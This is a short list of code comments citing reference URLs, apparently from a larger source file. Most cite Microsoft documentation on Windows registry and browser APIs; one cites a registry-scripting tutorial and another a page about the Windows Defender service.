//SOURCE_11 = https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx
//SOURCE_12 = https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537183(v=vs.85)
//          = https://msdn.microsoft.com/en-us/library/dn392609.aspx
//SOURCE_13 = https://www.serverwatch.com/tutorials/article.php/1476831/Managing-Windows-Registry-with-Scripting-Part-1.htm
//SOURCE_14 = https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regopenkeyexa
//SOURCE_15 = https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regsetvalueexa
//SOURCE_16 = https://computerstepbystep.com/windows_defender_service.html
